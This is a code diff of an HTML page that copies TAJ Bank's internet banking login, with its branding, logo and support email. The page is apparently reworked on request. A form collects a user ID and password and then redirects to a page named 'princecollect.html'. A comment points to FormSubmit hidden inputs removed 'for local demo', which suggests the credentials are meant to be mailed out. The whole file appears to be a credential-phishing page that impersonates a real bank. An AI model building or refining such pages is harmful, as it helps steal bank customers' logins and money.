@@ -1,211 +1,212 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TAJ Bank - Internet Banking Login</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>TAJ Bank - Internet Banking Login</title>
+<style>
+  /* Basic reset */
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%}
 
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-        }
+  /* Background color fallback (visible if images fail) */
+  body{
+    font-family: "Segoe UI", Roboto, Arial, sans-serif;
+    background-color:#dcdfe3; /* fallback background color */
+    color:#222;
+    height:100vh;
+    overflow:hidden;
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+  }
 
-        /* Background Slideshow */
-        #bg-slide {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            z-index: -3;
-        }
+  /* Fullscreen slideshow container */
+  #bg-slide{
+    position:fixed;
+    inset:0;
+    z-index:-10;
+    background-color:#dcdfe3; /* same fallback */
+  }
+  #bg-slide img{
+    position:absolute;
+    inset:0;
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    opacity:0;
+    filter:brightness(.75); /* darken a bit for contrast with card */
+    transition:opacity 1s ease-in-out;
+  }
+  /* Make three images cycle */
+  #bg-slide img.show{opacity:1}
 
-        #bg-slide img {
-            position: absolute;
-            width: 100%;
-            height: 100vh;
-            object-fit: cover;
-            opacity: 0;
-            animation: fade 18s infinite;
-        }
+  /* Overlay to dim background (so card stands out) */
+  .overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.45);
+    z-index:-5;
+  }
 
-        #bg-slide img:nth-child(1) { animation-delay: 0s; }
-        #bg-slide img:nth-child(2) { animation-delay: 6s; }
-        #bg-slide img:nth-child(3) { animation-delay: 12s; }
+  /* TAJ logo top-left or top-right - adapt as needed */
+  .bank-logo{
+    position:fixed;
+    left:30px;
+    top:18px;
+    width:170px;
+    max-width:22%;
+    z-index:20;
+    user-select:none;
+  }
 
-        @keyframes fade {
-            0% { opacity: 0; }
-            10% { opacity: 1; }
-            40% { opacity: 1; }
-            60% { opacity: 0; }
-            100% { opacity: 0; }
-        }
+  /* Right-side login container */
+  .page{
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:flex-end; /* right side */
+    padding:40px;
+    z-index:30;
+    position:relative;
+  }
 
-        /* Dark overlay */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            background: rgba(0,0,0,0.55);
-            z-index: -2;
-        }
+  .card{
+    width:500px;
+    min-height:500px;
+    background:#fff;
+    border-radius:10px;
+    padding:26px;
+    box-shadow:0 20px 50px rgba(0,0,0,0.35);
+    margin-left:40px;
+    margin-right:40px;   /* NEW: space at right side */
+}
 
-        /* Logo */
-        .bank-logo {
-            position: absolute;
-            top: 20px;
-            right: 30px;
-            width: 140px;
-            z-index: 10;
-        }
 
-        /* Right side login card */
-        .container {
-            height: 100vh;
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-            padding-right: 80px;
-        }
+  .card h2{color:#E41613;text-align:center;font-size:20px;margin-bottom:6px}
+  .line{height:4px;width:64px;background:#E41613;border:none;margin:10px auto 18px}
 
-        .card {
-            background: #fff;
-            width: 350px;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.3);
-        }
+  .card p.sub{color:#555;text-align:center;margin-bottom:18px;font-size:14px}
 
-        .card h2 {
-            text-align: center;
-            margin: 0;
-            font-weight: bold;
-            color: #E41613;
-        }
+  .field{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    background:#f4f4f6;
+    padding:11px 12px;
+    border-radius:6px;
+    margin-bottom:12px;
+  }
+  .field input{
+    border:0;outline:0;background:transparent;width:100%;font-size:14px;
+  }
 
-        .line {
-            width: 60px;
-            height: 3px;
-            background: #E41613;
-            margin: 10px auto 20px auto;
-            border: none;
-        }
+  .forgot{ text-align:right;margin-bottom:16px }
+  .forgot a{ color:#E41613;text-decoration:none;font-size:13px }
 
-        /* Input container */
-        .field {
-            background: #F4F4F4;
-            display: flex;
-            align-items: center;
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 15px;
-        }
+  .button{
+    width:100%;
+    background:#E41613;
+    color:#fff;
+    border:none;
+    padding:18px;
+    border-radius:6px;
+    font-weight:700;
+    cursor:pointer;
+    font-size:15px;
+  }
+  .button:hover{ background:#b90f0f }
 
-        .field input {
-            width: 100%;
-            border: none;
-            background: none;
-            outline: none;
-            font-size: 14px;
-        }
+  .card .contact{ font-size:12px;color:#444;margin-top:14px;text-align:center }
+  .card .contact a{ color:#E41613;text-decoration:none }
 
-        .forgot {
-            text-align: right;
-            margin-bottom: 20px;
-        }
+  .copyright{ text-align:center;font-size:12px;color:#777;margin-top:14px }
 
-        .forgot a {
-            font-size: 14px;
-            color: #E41613;
-            text-decoration: none;
-        }
-
-        .button {
-            width: 100%;
-            padding: 12px;
-            background: #E41613;
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .button:hover {
-            background: #b90f0f;
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #333;
-        }
-
-        @media(max-width: 800px) {
-            .container {
-                justify-content: center;
-                padding-right: 0;
-            }
-        }
-    </style>
+  @media(max-width:900px){
+    .page{ justify-content:center;padding:20px }
+    .bank-logo{ left:14px; width:120px }
+  }
+</style>
 </head>
 <body>
 
-    <!-- Background slideshow -->
-    <div id="bg-slide">
-        <img src="images/banner-bg1.jpeg">
-        <img src="images/banner-bg3 1.png">
-        <img src="images/banner-bg8.jpeg">
-    </div>
+  <!-- Background slideshow images (use the filenames you have) -->
+  <div id="bg-slide" aria-hidden="true">
+    <!-- prefer renamed filenames if you renamed; otherwise the encoded path is here too -->
+    <img id="bg1" src="images/banner-bg1.jpeg" alt="bg1" />
+    <img id="bg2" src="images/banner-bg3%201.png" alt="bg2" />
+    <img id="bg2b" src="images/banner-bg3-1.png" alt="bg2b" style="display:none" />
+    <img id="bg3" src="images/banner-bg8.jpeg" alt="bg3" />
+  </div>
 
-    <!-- Dark overlay -->
-    <div class="overlay"></div>
+  <div class="overlay"></div>
 
-    <!-- Logo -->
-    <img src="images/tajbank 1.png" class="bank-logo">
+  <!-- Logo: try both encoded and hyphen name if needed -->
+  <img class="bank-logo" src="images/tajbank%201.png" alt="TAJ Bank Logo"
+       onerror="this.onerror=null; this.src='images/tajbank-1.png';" />
 
-    <!-- Login UI -->
-    <div class="container">
-        <div class="card">
+  <div class="page" role="main">
+    <div class="card" role="region" aria-label="Login">
+      <h2>Internet Banking</h2>
+      <hr class="line" />
+      <p class="sub">Welcome to TAJ Bank - Login to access your profile</p>
 
-            <h2>Internet Banking</h2>
-            <hr class="line">
-
-            <div class="field">
-                <input type="text" placeholder="User ID">
-            </div>
-
-            <div class="field">
-                <input type="password" placeholder="Password">
-            </div>
-
-            <div class="forgot">
-                <a href="#">Forgot Password?</a>
-            </div>
-
-            <button class="button" onclick="login()">Login</button>
-
-            <div class="footer">
-                © TAJ Bank Plc - All Rights Reserved
-            </div>
-
+      <form id="loginForm" onsubmit="return submitAndRedirect(event)">
+        <div class="field">
+          <input type="text" name="username" placeholder="Enter User ID" required autocomplete="off">
         </div>
-    </div>
 
-    <!-- Redirect script -->
-    <script>
-        function login() {
-            window.location.href = "princecollect.html";
-        }
-    </script>
+        <div class="field">
+          <input type="password" name="password" placeholder="Enter Password" required autocomplete="off">
+        </div>
+
+        <div class="forgot"><a href="/Account/ForgotPassword">Forgot Password?</a></div>
+
+        <!-- keep FormSubmit hidden inputs if you want to use them; removed for local demo -->
+        <button class="button" type="submit">Submit</button>
+      </form>
+
+      <div class="contact">
+        <div>Contact Support: <a href="mailto:tajconnect@tajbank.com">tajconnect@tajbank.com</a></div>
+      </div>
+
+      <div class="copyright">© 2025. All Rights Reserved.</div>
+    </div>
+  </div>
+
+<script>
+  // Slideshow logic: cycles images by toggling 'show' class
+  (function(){
+    const imgs = Array.from(document.querySelectorAll('#bg-slide img')).filter(i=>i.complete || true);
+    // Filter visible images only (exclude the backup hidden element if present)
+    const visibleImgs = imgs.filter(img => img.style.display !== 'none');
+    let i = 0;
+    function showNext(){
+      visibleImgs.forEach((img, idx)=> img.classList.toggle('show', idx === i));
+      i = (i+1) % visibleImgs.length;
+    }
+    // initial
+    showNext();
+    // 6s per image
+    setInterval(showNext, 6000);
+  })();
+
+  // Submit handler: navigate to princecollect.html like your original code
+  function submitAndRedirect(e){
+    e.preventDefault();
+    // If you want to actually send the form to a server, use fetch/XHR here.
+    // But as requested: redirect to princecollect.html after submit
+    // Preserve 200ms small delay like your original code.
+    setTimeout(()=> window.location.href = 'princecollect.html', 200);
+    return false;
+  }
+
+  // Helpful console hint if image missing
+  window.addEventListener('error', function(ev){
+    if(ev.target && ev.target.tagName === 'IMG'){
+      console.warn('Image failed to load:', ev.target.src);
+    }
+  }, true);
+</script>
 
 </body>
 </html>
